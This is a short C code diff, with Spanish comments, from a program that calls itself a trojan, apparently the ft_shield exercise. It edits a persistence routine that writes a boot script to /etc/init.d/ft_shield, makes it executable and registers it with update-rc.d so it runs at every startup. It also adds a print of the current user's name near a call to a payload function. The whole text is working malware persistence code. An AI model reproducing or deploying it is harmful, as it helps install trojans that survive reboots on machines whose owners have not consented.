@@ -8,11 +8,11 @@ int ft_persistence(t_troyan *shield)
         printf("ERROR: failed to open init.d file\n");
         return(-1);
     }
-    // Escribir ft_shied.txt (script de arranque del troyano)
+    fprintf(shield->fd_init, LSB, 10, 10, 10, 10, 10, 10, 10, 10, 10);
+    fprintf(shield->fd_init, PERSISTENCE, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10);
     fclose(shield->fd_init);
     chmod("/etc/init.d/ft_shield", 0755);
-    // Registro en el sistema con:
-    system("update-rc.d ft_shield defaults");
+    system("update-rc.d ft_shield defaults");         // Registro en el sistema
     return(0);
 }
 
@@ -62,6 +62,7 @@ int main()
         free(shield);
         return (1);
     }
+    printf("%s\n", shield->pwd->pw_name);
     if (ft_payload(shield) || ft_persistence(shield))
     {
         free(shield);
